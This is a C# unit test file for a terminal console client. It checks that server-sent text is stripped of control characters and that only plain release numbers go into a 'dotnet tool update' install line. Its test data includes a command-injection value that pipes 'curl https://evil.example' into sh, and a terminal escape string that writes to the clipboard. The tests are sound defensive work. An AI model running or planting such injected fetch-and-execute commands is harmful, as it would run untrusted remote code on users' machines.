using AwesomeAssertions;
using Trax.Api.Console.Terminal.Connection;
using Trax.Api.Console.Terminal.Headless;
using Trax.Api.Console.Terminal.Tests.Fakes;

namespace Trax.Api.Console.Terminal.Tests.UnitTests;

/// <summary>
/// What the host sends reaches the terminal cleaned: a refusal on standard error, a machine drawn by <c>graph</c>,
/// and a version, which is refused unless it is a release number since it goes into an install line.
/// </summary>
[TestFixture]
public class HeadlessHostTextTests
{
    private const string Hostile = "card\u001b]52;c;ZXZpbA==\u0007\u202Eflag";

    [TestCase("1.69.0; curl https://evil.example | sh")]
    [TestCase("1.69.0\n")]
    [TestCase("1.69.0+build")]
    [TestCase("v1.69.0")]
    public async Task A_version_that_is_not_a_release_number_is_refused_without_an_install_line(
        string version
    )
    {
        await using var session = Hosts.Session(
            new FakeHost().Answer("ServerVersion", Hosts.Version(version))
        );

        var check = await session.CheckVersionAsync();

        check
            .Should()
            .BeOfType<VersionCheck.Failed>()
            .Which.Message.Should()
            .NotContain("dotnet tool")
            .And.NotContain("curl");
        FluentActions
            .Invoking(() => ConsoleSession.InstallLine(version))
            .Should()
            .Throw<ArgumentException>();
    }

    [TestCase("1.69.0")]
    [TestCase("1.69.0-ms14.1")]
    public void A_release_number_gets_an_install_line(string version) =>
        ConsoleSession
            .InstallLine(version)
            .Should()
            .Be($"dotnet tool update -g Trax.Api.Console.Terminal --version {version}");

    [Test]
    public async Task A_refusal_at_connect_is_written_cleaned_with_exit_code_1()
    {
        var host = new RefusingHost(new FakeHost()).Refuse(
            "ServerVersion",
            Hostile,
            "AUTH_NOT_AUTHORIZED"
        );

        var (exit, _, error) = await Hosts.RunAsync(host, "list", "runs");

        exit.Should().Be(1);
        error.Should().StartWith("AUTH_NOT_AUTHORIZED: card");
        error.Should().NotContainAny("\u001b", "\u0007", "\u202E");
    }

    [Test]
    public async Task A_graph_writes_the_hosts_names_cleaned()
    {
        await using var session = Hosts.Session(
            new FakeHost().Answer(
                "Machines",
                """{"operations":{"machines":[{"name":"MACHINE","version":1,"systemOwned":false,"initialState":"STATE","states":[{"name":"STATE","isInitial":true,"isFinal":true,"isCommitted":false}],"transitions":[],"timers":[]}]}}"""
                    .Replace("MACHINE", Escaped(Hostile))
                    .Replace("STATE", Escaped(Hostile))
            )
        );
        var output = new StringWriter();

        var exit = await HeadlessCommands.GraphAsync(
            session,
            machine: null,
            vertical: false,
            output,
            new StringWriter(),
            CancellationToken.None
        );

        exit.Should().Be(0);
        output.ToString().Should().Contain("card").And.NotContainAny("\u001b", "\u0007", "\u202E");
    }

    private static string Escaped(string text) =>
        System.Text.Json.JsonSerializer.Serialize(text)[1..^1];
}
